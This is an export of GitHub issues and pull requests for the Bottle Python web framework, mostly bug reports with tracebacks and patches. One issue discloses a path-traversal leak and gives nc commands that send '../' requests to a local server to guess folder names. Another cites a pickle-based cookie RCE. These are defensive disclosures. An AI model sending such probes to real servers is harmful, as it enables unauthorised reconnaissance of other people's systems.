@admin_app.get('/')
def admin():
    return 'Admin'


app.mount('/admin', admin_app_session)
bottle.run(app, host='0.0.0.0')
```
"
457,bottle silently merges responses / bottle is not reentrant,2013-02-12T00:17:36Z,,,AssertionError,AssertionError: Content-Length is different from actual app_iter length (3!=8),"Running this code should reproduce

```
#!/usr/bin/env python

from webtest import TestApp
from bottle import Bottle

Alpha = Bottle()
Bravo = Bottle()

TestAlpha = TestApp(Alpha)
TestBravo = TestApp(Bravo)

@Alpha.route('/')
def route1():
    return '12345%s' % TestBravo.get('/').body

@Bravo.route('/')
def route2():
    return '123'

# This blows up with
# AssertionError: Content-Length is different from actual app_iter length (3!=8)
# because the content-length from route2's response (len=3) is reused for the
# response to route1.
def main():
    print 'Alpha says %s' % TestAlpha.get('/').body

if __name__ == '__main__':
    main()
```

Full Backtrace:

```
Traceback (most recent call last):
  File ""./bottle-response-bleed.py"", line 28, in <module>
    main()
  File ""./bottle-response-bleed.py"", line 25, in main
    print 'Alpha says %s' % TestAlpha.get('/').body
  File ""/home/mike/.virtualenvs/tmp/lib/python2.7/site-packages/webtest/app.py"", line 759, in get
    expect_errors=expect_errors)
  File ""/home/mike/.virtualenvs/tmp/lib/python2.7/site-packages/webtest/app.py"", line 1109, in do_request
    res.body
  File ""/home/mike/.virtualenvs/tmp/lib/python2.7/site-packages/webob/response.py"", line 361, in _body__get
    % (self.content_length, len(body))
AssertionError: Content-Length is different from actual app_iter length (3!=8)
```

```
WebOb==1.2.3
WebTest==1.4.3
bottle==0.11.6
```
"
456,Bottle cannot serve requests after a connection is forcibly closed .,2013-02-11T09:16:12Z,2013-02-11T15:54:51Z,,,,"I have web page that constantly pulls bottle server for updates (every second) .
All browsers are fine , but when access this page from IE(7,8,9) and i close IE's window ..
i get the following exception :

```
Exception happened during processing of request from ('127.0.0.1', 63166)
Traceback (most recent call last):
  File ""c:\python27\lib\SocketServer.py"", line 284, in _handle_request_noblock
    self.process_request(request, client_address)
  File ""c:\python27\lib\SocketServer.py"", line 310, in process_request
    self.finish_request(request, client_address)
  File ""c:\python27\lib\SocketServer.py"", line 323, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""c:\python27\lib\SocketServer.py"", line 638, in __init__
    self.handle()
  File ""c:\python27\lib\wsgiref\simple_server.py"", line 116, in handle
    self.raw_requestline = self.rfile.readline()
  File ""c:\python27\lib\socket.py"", line 447, in readline
    data = self._sock.recv(self._rbufsize)
error: [Errno 10054] An existing connection was forcibly closed by the remote host
```

After that the server cannot recover , and all further requests are failed until the service
is restarted ..  ( Sometimes though it recovers after a couple of minutes )

Tested on:
Windows(XP,7,8) , Python 2.7.3
Ubuntu 12.10 , Python 2.7.3
"
455,"hooks before_request and after_request are not called when route is not match, i.e when 404/405 status code is returned",2013-02-08T12:49:38Z,2013-06-21T18:37:57Z,Undecided,,,"I.e. I would like to log all incoming requests and responses. But when unknown method are requested 'route, args = self.router.match(environ)' raise HTTPError() and no any hooks are called.
"
454,mod_wsgi: Segmentation fault problem related with bottle,2013-02-06T09:56:04Z,2013-02-11T16:15:00Z,,,,"If i use ""import bottle"" in wsgi python application, than application fails with ""Segmentation fault"" error (httpd-errorlog) and creates a core file. 

platform: FreeBSD 8.3 stable
bottle version: py27-bottle-0.11.6
openssl version: OpenSSL 0.9.8q 2 
httpd -V
Server version: Apache/2.2.23 (FreeBSD)
Server built:   Feb  6 2013 10:10:01
Server's Module Magic Number: 20051115:31
Server loaded:  APR 1.4.6, APR-Util 1.4.1
Compiled using: APR 1.4.6, APR-Util 1.4.1
Architecture:   64-bit
Server MPM:     Prefork
  threaded:     no
    forked:     yes (variable process count)
Server compiled with....
 -D APACHE_MPM_DIR=""server/mpm/prefork""
 -D APR_HAS_SENDFILE
 -D APR_HAS_MMAP
 -D APR_HAVE_IPV6 (IPv4-mapped addresses disabled)
 -D APR_USE_FLOCK_SERIALIZE
 -D APR_USE_PTHREAD_SERIALIZE
 -D SINGLE_LISTEN_UNSERIALIZED_ACCEPT
 -D APR_HAS_OTHER_CHILD
 -D AP_HAVE_RELIABLE_PIPED_LOGS
 -D DYNAMIC_MODULE_LIMIT=128
 -D HTTPD_ROOT=""/usr/local""
 -D SUEXEC_BIN=""/usr/local/bin/suexec""
 -D DEFAULT_PIDLOG=""/var/run/httpd.pid""
 -D DEFAULT_SCOREBOARD=""logs/apache_runtime_status""
 -D DEFAULT_LOCKFILE=""/var/run/accept.lock""
 -D DEFAULT_ERRORLOG=""logs/error_log""
 -D AP_TYPES_CONFIG_FILE=""etc/apache22/mime.types""
 -D SERVER_CONFIG_FILE=""etc/apache22/httpd.conf""
# Details about core file:

```
(gdb) bt
#0  0x0000000803e0c2f0 in EVP_PKEY_CTX_dup () from /usr/local/lib/libcrypto.so.8
#1  0x0000000803dffa4f in EVP_MD_CTX_copy_ex () from /usr/local/lib/libcrypto.so.8
#2  0x0000000807309f26 in EVPnew () from /usr/local/lib/python2.7/lib-dynload/_hashlib.so
#3  0x000000080730a250 in EVP_new_md5 () from /usr/local/lib/python2.7/lib-dynload/_hashlib.so
#4  0x0000000805347c52 in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#5  0x0000000805349013 in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#6  0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#7  0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#8  0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#9  0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#10 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#11 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#12 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#13 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#14 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#15 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#16 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#17 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#18 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#19 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#20 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#21 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#22 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#23 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#24 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#25 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#26 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#27 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
---Type <return> to continue, or q <return> to quit---
#28 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#29 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#30 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#31 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#32 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#33 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#34 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#35 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#36 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#37 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#38 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#39 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#40 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#41 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#42 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#43 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#44 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#45 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#46 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#47 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#48 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#49 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#50 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#51 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#52 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#53 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#54 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#55 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
---Type <return> to continue, or q <return> to quit---
#56 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#57 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#58 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#59 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#60 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#61 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#62 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#63 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#64 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#65 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#66 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#67 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#68 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#69 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#70 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#71 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#72 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#73 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#74 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#75 0x0000000805154b39 in wsgi_load_source (pool=0x80175d028, r=0x80175d0a0, name=0x80175f5f0 ""_mod_wsgi_e93ce327bcb956f5b8088e28e282797d"", exists=Variable ""exists""                               is not available.
)
    at mod_wsgi.c:6402
#76 0x000000080515882e in wsgi_execute_script (r=0x80175d0a0) at mod_wsgi.c:6759
#77 0x000000080515c315 in wsgi_process_socket (p=Variable ""p"" is not available.
) at mod_wsgi.c:13567
#78 0x000000080515c794 in wsgi_daemon_thread (thd=0x80169eda0, data=Variable ""data"" is not available.
) at mod_wsgi.c:10993
#79 0x00000008012924f1 in pthread_getprio () from /lib/libthr.so.3
#80 0x0000000000000000 in ?? ()
Cannot access memory at address 0x7fffff7fd000
```

how can i solve it?
"
453,TypeError when using Cython,2013-02-06T09:07:29Z,2013-02-11T16:18:22Z,,TypeError,TypeError: server_static() takes no keyword arguments,"Hi , i am using Cython to write my bottle based application .
inside my application i serve static files like this :

@controller.route('/Apps/filepath:path')
def server_static(filepath):
    return static_file(filepath,root='%s/Apps' %myPath)

When i run this code as Python code , static files being served as intended ,
but when i compile my project to Cython code , and try to access a static file 
i get following error : 

Traceback (most recent call last):
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 763, in _handle
    return route.call(*_args)
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 1572, in wrapper
    rv = callback(_a, **ka)
TypeError: server_static() takes no keyword arguments

Note : i am compiling only my modules to Cython , Bottle module is not touched .
Also everything else works as it should .. only accessing static files rises the exception.

Python 2.7 Linux , Bottle 11.4 , Cython 0.16
"
452,DELETE before GET obscures route,2013-02-06T00:33:05Z,2017-07-17T23:25:27Z,"Bug, Undecided",,,"I came across an issue with 0.11.6 where listing a route with a DELETE before a route with a GET obscures the GET path and you can't get to it, ending up with a 405.  I will paste the code below.  The only path that doesn't work is where the DELETE and GET routes are the same.
"
451,docs/recipes.rst: ``before_request`` fixed,2013-02-05T12:02:06Z,2013-02-11T16:27:58Z,,,,"fixed `before_callback` to `before_request` in docs/recipes.rst
"
450,URL encoded characters affect route,2013-02-05T05:32:24Z,2013-02-05T15:58:38Z,,,,"I don't know if this is standard behaviour, but it seems very strange to me:

```
http://127.0.0.1:8080/test/foo%2Fbar
```

I've defined a route for `/test/:x`, but I receive the error:

```
Not found: '/test/foo/bar'
```

The fact that the slash character is decoded and used in route determination seems like incorrect behaviour.
"
449,Fix for silent truncation during post (re: pull #399),2013-02-03T19:05:06Z,2013-02-11T18:40:56Z,,,,"Fix for situations where content is larger than memory, we should not truncate but give a 413 error.
https://github.com/defnull/bottle/pull/399
"
448,Possible (arguably safer) alternative to pickle for cookie serialisation,2013-02-03T17:41:31Z,2013-02-11T16:37:38Z,,,,"Addresses issue #447.
"
447,Possibly unsafe use of pickle(),2013-02-03T16:57:29Z,2016-05-24T21:08:04Z,Bug,,,"I've come across http://vudang.com/2013/01/python-web-framework-from-lfr-to-rce/, which outlines a possible exploit in default bottle.py cookie handling. 

Perhaps using json.dumps() and reads() would be enough here? AFAIK the JSON decoder does not share this vulnerability.
"
446,Fix content-type header in mounted apps.,2013-02-01T18:42:48Z,2013-02-01T18:50:39Z,,,,"The fix in 0.11.5 to update the mountpoint_wrapper introduced a bug where ""Content-Type: text/html; charset=UTF-8"" is added in all my responses even though I'm only sending json and already set the appropriate header. Changing it back fixes the problem.
"
445,MEMFILE_MAX doesn't work in 0.11.4,2013-01-31T15:51:27Z,2013-02-11T16:31:52Z,,,,"MEMFILE_MAX doesn't work in 0.11.4 but in 0.10.11 works
"
444,@never_cache decorator,2013-01-27T09:06:24Z,2013-01-31T01:26:35Z,,,,"I built API based on bottle,  communicate with flash client.

I found that It's more convenient  using a decorator to set no-cache than  write
`response.set_header` in all GET method functions.

So, I added the `never_cache` decorator, and tests

```
from bottle import never_cache

@app.get('PATH')
@never_cache
def my_func():
    return 'hello'
```
"
443,"README, add lazier install, re #442",2013-01-27T00:48:20Z,2013-02-11T16:44:33Z,,,,
442,"Git tag/branch for 'release' or such, or easy curling",2013-01-27T00:33:45Z,2013-02-11T16:43:53Z,,,,"In README and other docs, it would be nice to see a stable one-line installer for the truly lazy:

```
curl https://raw.github.com/defnull/bottle/release/bottle.py -o bottle.py
```

For that to happen, there needs to be a tag/branch for 'release'.  
"
441,Start Bottle.app with Tornado server.,2013-01-25T00:17:22Z,2013-01-25T21:59:49Z,,,,"I have next config on my server:
nginx(listen port 80) >> tornado(listen 8888 port) >> bottleapp.
When tornado server started, default host(address) is """", and he listen all possible hostnames('localhost"", ip on local network, ect) on port 8888
Wee can  go at our site like example.com/  and example.com:8888/ . It's not safe.
"
440,Add a submit button to HTML file-upload form,2013-01-23T03:35:23Z,2013-02-11T16:49:19Z,,,,"It's helpful for newbies.
"
439,"ResourceManager for static files (e.g. css, jss)?",2013-01-20T09:18:15Z,,,,,"Hey, I just got started with bottlepy and am looking for a way to provide static files, such as bootstrap.css or jQuery. I did find a way with static_file and app.get_url. Though I am just curious, would it be possible to do the same thing with ResourceManager as well?
There is not much documentation on it and I couldn't really find any examples.
It would be great if there would be some example for that (if it is for what I think it is).
"
438,Some cookies are lost when using mount(),2013-01-19T10:55:48Z,2013-01-21T12:26:28Z,,,,"I'm mounting some routes through app.mount(), and it looks like that only one cookies of all the cookies I have set are sent to the browser. I think the issue is somewhere here in bottle.py v11.4:

```
    def mountpoint_wrapper():
        try:
            request.path_shift(path_depth)
            rs = BaseResponse([], 200)
            def start_response(status, header):
                rs.status = status
                for name, value in header: rs.add_header(name, value)
                return rs.body.append
            body = app(request.environ, start_response)
            body = itertools.chain(rs.body, body)
            return HTTPResponse(body, rs.status_code, **rs.headers)
        finally:
            request.path_shift(-path_depth)
```

At least, rs.headers.dict contains all cookies, but the variable headers in HTTPResponse doesn't contain any.

Could it because **getitem** of HeaderDict returns the last item instead of all items ?
"
437,Server adapters does not accept kwargs,2013-01-15T13:02:19Z,,,,,"`bottle.run` has `**kwargs` but and send it to server adapters, but all adapters does not accept `**kwargs`. Some of these adapters probably can accept custom configuration.

It is related with #436.
"
436,SSL support with gevent server,2013-01-15T08:43:45Z,2013-01-15T13:56:09Z,,,,"As of version 0.13.8, gevent's support of SSL connection seems working fine.
Nonetheless, bottle still states GeventServer has no SSL support.

Here comes a gevent class that support SSL.

``` python
class SecureGeventServer(ServerAdapter):
    def run(self, handler):
        from gevent import wsgi, pywsgi, local
        import threading
        _lcth = threading.local()
        if not isinstance(_lcth, local.local):
            msg = ""Bottle requires gevent.monkey.patch_all() (before import)""
            raise RuntimeError(msg)
        if not self.options.get('fast'): wsgi = pywsgi
        log = None if self.quiet else 'default'
        wsgi.WSGIServer((self.host, self.port), handler, log=log, keyfile='server.key', certfile='server.crt').serve_forever()

app = Bottle()

port = int(os.environ.get(""PORT"", 443))
run(app=app, host='0.0.0.0', port=port, server=SecureGeventServer)
```

It works fine with me but I have no idea how well it will work in different environments. 

It is deployed with
Python : 2.7.3
Gevent : 0.13.8
Bottle : 0.11.2

Looking forward to hearing from you.
"
435,Removing `method` keyword before non-keyword,2013-01-14T13:37:31Z,2013-01-14T16:59:10Z,,,,"It was reported here: https://twitter.com/markessien/status/290117732450574337
"
434,"New doc section about adding authentication, and 2 small fixes",2013-01-12T21:48:40Z,,,,,"Small fixes look ok to me, but perhaps the ':doc:' means something else?
"
433,Small fix to makelist regarding empty strings,2013-01-07T16:44:39Z,2013-02-11T16:52:16Z,,,,"Currently, makelist returns an empty list when given an empty string. Fixed to return a list contatining the empty list.
"
432,Proposal WRT function 'code' in class 'SimpleTemplate': without 'repr',2013-01-06T02:09:44Z,2013-02-11T16:57:18Z,,,,"I (would) like to use %include in such a manner that I can determine the filename as a parameter in the calling template-function:

<pre>
bottle.template('views/base.tpl', to_be_included = 'views/text_de.tpl')
</pre>

and in the template 'base.tpl':

<pre>
...
%include to_be_included
...
</pre>

so that I can build different websites starting from the same base.tpl, but with different included templates.
To reach that, one could very slightly modify the function 'code' in the class 'SimpleTemplate', namely delete the repr()-call in the following segment:

<pre>
                    if len(p) == 2:
                        code(""_=_include(%s, _stdout, %s)"" % (repr(p[0]), p[1]))
                    elif p:
                        code(""_=_include(%s, _stdout)"" % repr(p[0]))
</pre>

Thus, I would have the choice, if I write

<pre>
%include 'path'
</pre>

or

<pre>
%include path
</pre>

In the first case, I determine the path in the template, in the second case, I determine the path in my python-code.
I tried it - with other path names - and it worked. But maybe I simply do not see the deciding advantages of the repr()-call -- so excuse my long question, please!
By the way: I like Bottle very much; it is simply great (and in this sentence one can emphasize both 'simply' and 'great').
"
431,self.quiet should not stop messages to logging,2013-01-04T22:35:33Z,2013-01-21T12:52:36Z,,,,"As per. the documentation:
""quiet: Suppress output to stdout and stderr? (default: False)""
Before this patch self.quiet also suppressed log messages to the 'wsgi' logger.
"
430,Update docs/tutorial_app.rst,2013-01-04T01:00:09Z,,,,,"fixed line 154 typo: quiet -> quite
"
429,mount() not working,2013-01-01T23:07:57Z,2013-01-02T23:23:53Z,,,,"I'm following the docs and trying to mount a sub app but this code fails to resolve the mounted app paths (v0.12-dev)

```
from gevent import monkey;monkey.patch_all()
import bottle

app = bottle.Bottle()
@app.route('/')
def home():
    pass

subapp = bottle.Bottle()
@subapp.route('/test')   #I'm getting 404 error here
def test():
    pass

app.mount(subapp, '/test')

if __name__ == '__main__':
    bottle.run(app=app, host='0.0.0.0', port='80', server='gevent')
```
"
428,"request.forms.get(""file"") with form with type=""file"" does not work",2012-12-26T11:54:31Z,,,,,"With form with:

<form method=""POST"" action=""/sources"">
        ${loc('File')}: <input name=""addsource"" type=""file""/>
                        <input type=""reset"" value=""${loc('Reset')}""/>
                        <input type=""submit"" value=""${loc('OK')}""/>
     </form>


The addedsource = request.forms.get('addsource') return **only** the name of the file not the whole path itself. With type=""text"", I get it.

By the other hand, request.files.get does not work for me.

Thanks in advance,
Xan.
"
427,typo,2012-12-24T14:39:12Z,2012-12-24T15:41:24Z,,,,
426,Cherrypy Adapter does not work on Ubuntu 12.04 LTS,2012-12-20T11:22:58Z,,,,,"When running Bottle (0.11.4) with the Cherrypy server adapter unter Ubuntu 12.04, the server fails to start with an import error, as the WSGI Server from Cherrypy can't be loaded.

When I type ""import cherrypy;dir(cherrypy)"" I indeed do not see any WSGI modul / class...

Cherrypy version is the one from the Ubuntu repositires, 2.3.0.
"
425,Support HTTP PATCH method as per RFC #5789,2012-12-18T11:45:05Z,2014-04-13T21:08:56Z,,,,"This would be nice to have built-in as a @patch decorator.
"
424,Don't follow links,2012-12-17T16:37:16Z,2012-12-19T19:17:01Z,,,,"Hi,

if in bottle, you add an absolute uri like this:

```
<a href=""file:///home/xan/proves/github/quatrilio@github.com/xi/test/test.txt"">A</a>
```

Then firefox does not follow the link.

I suspect this is because static file behaviour. Can you confirm that and change this allowing firefox to follow link.

Thanks in advance,
Xan.
"
423,Expose Jinaj2 globals directive,2012-12-17T13:16:17Z,2013-12-04T09:39:13Z,,,,"This patch exposes the 'globals' directive for the Jinja2 wrapper.
"
422,Trying to understand #396,2012-12-15T21:19:23Z,2012-12-16T13:53:07Z,,,,"I don't know if it should be merged, I'm just trying to understand the `auth_basic` don't sending the headers (#396). The test works, but the header is title case `Www-Authenticate`.
"
421,bug in calculation with results under 1? ,2012-12-15T00:54:09Z,2012-12-15T03:12:59Z,,ZeroDivisionError,ZeroDivisionError: integer division or modulo by zero,"print(9/10)
0
print(float(9/10))
0.0

normal python interpreter:
print(9/10)
0.9
also every calculator.

in turn of this my app crashes with this error:
ZeroDivisionError: integer division or modulo by zero

something is wrong with bottle.
"
420,Support Dojo jsonREST GET request?,2012-12-14T12:08:01Z,,,,,"Dojo's ""dojo/store/JsonRest"" module will send RESTful get requests that look like:

OPTIONS /myapp/getData HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.11) Gecko/20121121 Firefox/10.0.11
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,_/_;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Origin: http://localhost
Access-Control-Request-Method: GET
Access-Control-Request-Headers: x-requested-with

Bottle does not seem to recognize this as a GET request. 
"
419,How do I force certain HTTP headers in all responses?,2012-12-14T11:32:55Z,2012-12-14T12:02:17Z,,,,"I have tried:

``` python
from bottle import Response

Response(headers={""X-Frame-Options"": ""sameorigin"", ""X-XSS-Protection"": ""1; mode=block""})

[...]

@get(""/session/new"")
def session_new():
    """"""
    Create new session token
    """"""
    global session_ids
    session_id = hexencode(os.urandom(32))
    session_ids.append(session_id)
    response.content_type = ""application/json; charset=UTF-8""
    return {""sessionid"": session_id}
```

But the HTTP response has not the two headers I expect (`X-Frame-Options` and `X-XSS-Protection`):

```
HTTP/1.0 200 OK
Date: Fri, 14 Dec 2012 10:57:19 GMT
Server: WSGIServer/0.1 Python/2.7.3
Content-Length: 81
Content-Type: application/json; charset=UTF-8

{""sessionid"": ""226a6cfe02d8c64c480fbb5176c5e56a1385d71ba18fc6f938ae658516b82ba7""}
```

I am using latest development version of bottle.py from the GitHub repository (36d84c0a5005ce25a6abca5038ea7a4505279934).

On a side note, is it possible to customize the Server header value across all responses too?
I am setting the content_type to application/json function by function, would you recommend setting it globally too? I am developing a REST-JSON API.

Thank you.
Bernardo
"
418,relative import does not work when using reloader,2012-12-07T05:48:49Z,,,ValueError,ValueError: Attempted relative import in non-package,"structure:

```
pkg
  + __init__.py
  + main.py
  + util.py
```

FILE: pkg.main.py

``` python
from .util import * # this line will raise a ValueError
if __name__ == '__main__':
    run(..., reload=True)
```

``` sh
[~]$ python -m pkg.main
ValueError: Attempted relative import in non-package
```

The relative import will be fail because `__package__` is not set.
bottle version: 0.11.4
"
417,Update HTTPResponse call when mounting apps,2012-12-05T17:28:06Z,2012-12-06T13:04:48Z,,,,"Applying it to release 0.11 to remove the warning described in #395. I'm not sure if this is the right way to do it (duplicating pull requests to make it to 0.11 branch and to master).
"
416,Update HTTPResponse call when mounting apps,2012-12-05T17:16:02Z,2012-12-06T13:03:14Z,,,,"It solves #395 and should be applied to v0.11 branch too.
"
415,Typo in test_resources.py,2012-12-05T16:48:58Z,2012-12-06T13:02:22Z,,,,
414,Feature to detect when a client closed a long-running connection,2012-12-03T06:45:34Z,2012-12-03T17:18:54Z,,,,"I have a threaded EventSource-style request handler that runs forever and keeps sending data with yield. I'd like to detect when the client has closed the HTTP connection so I can exit the loop, otherwise I keep piling up threads.

Is there something in bottle in the request or response object that I can query to find out if the connection is still open, or is there a socket close callback that I can register? I'm currently using the Rocket server, perhaps it has something that can be queried, and I can get a reference to the underlying rocket handler instance?
"
413,Use Python syntax highlighting in the readme file,2012-12-01T20:02:17Z,2013-01-21T12:55:04Z,,,,
412,Using ANY instead of ALL,2012-12-01T12:58:24Z,2012-12-01T14:06:40Z,,,,"Just solving #409.
"
411,static_file / :path filter insecure - disclosure parent folder names,2012-12-01T08:27:17Z,,,,,"We can use ""../some_guess"" in request, to check if the parent folder on the filesystem is named ""some_guess"".

Source:

``` python
from bottle import *

@route('/static/<filepath:path>')
def server_static(filepath):
    return static_file(filepath, root=""/tmp"")

run(host='localhost', port=3123)
```

Start server:

``` bash
/tmp $ python web.py 
Bottle v0.12-dev server starting up (using WSGIRefServer())...
Listening on http://localhost:3123/
Hit Ctrl-C to quit.

```

Example requests:

``` bash
/tmp $ echo -en 'GET /static/../some_test/web.py HTTP/1.1\r\n\r\n' | nc 127.0.0.1 3123
HTTP/1.0 403 Forbidden
...

$ echo -en 'GET /static/../tmp/web.py HTTP/1.1\r\n\r\n' | nc 127.0.0.1 3123
HTTP/1.0 200 OK
<source goes here>
```

So, we can distinguish valid and invalid guesses. Not crucial, but not good 
"
410,it is a bug of template cache?,2012-11-29T09:49:26Z,,,,,"If you use the view decorator, maybe it would never hit the template cache.
Because the parameter passed by view function is always tpl_name, but the key of TEMPLATES is tplid.

``` python
def view(tpl_name, **defaults):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            result = func(*args, **kwargs)
            if isinstance(result, (dict, DictMixin)):
                tplvars = defaults.copy()
                tplvars.update(result)
                return template(tpl_name, **tplvars)
            return result
        return wrapper
    return decorator

def template(*args, **kwargs):
    tpl = args[0] if args else None
    adapter = kwargs.pop('template_adapter', SimpleTemplate)
    lookup = kwargs.pop('template_lookup', TEMPLATE_PATH)
    tplid = (id(lookup), tpl)
    if tpl not in TEMPLATES or DEBUG:
        settings = kwargs.pop('template_settings', {})
        if isinstance(tpl, adapter):
            TEMPLATES[tplid] = tpl
            if settings: TEMPLATES[tplid].prepare(**settings)
        elif ""\n"" in tpl or ""{"" in tpl or ""%"" in tpl or '$' in tpl:
            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)
        else:
            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)
    if not TEMPLATES[tplid]:
        abort(500, 'Template (%s) not found' % tpl)
    for dictarg in args[1:]: kwargs.update(dictarg)
    return TEMPLATES[tplid].render(kwargs)
```
"
409,recipe for call_wsgi has typo,2012-11-28T15:12:22Z,2012-12-04T18:19:42Z,,,,"The recipe for routing to sub WSGI apps has a typo, instead of ""method='ALL'"" it should read ""method='ANY'"".  This is the online link: http://bottlepy.org/docs/dev/recipes.html#embedding-other-wsgi-apps
"
408,"issue 407, ""why render empty string when using @view and no return statement?""",2012-11-27T18:18:15Z,2012-11-27T18:28:21Z,,,,
407,why render empty string when using @view and no return statement?,2012-11-27T15:44:01Z,2012-11-27T18:31:49Z,,,,"I understand mechanistically why this is happening. But it seems sensible to me, that given that Python does nothing to enforce that a return statement is present ,  that if a route-method returns None and a @view decorator is in place, the template should be rendered with the empty dict. (As opposed to rendering the empty string).
"
406,Added support for arrays in POST requests,2012-11-23T12:28:37Z,,,,,"You can now send form via POST with HTMLElement names like my_arr[] and myarr[key]
"
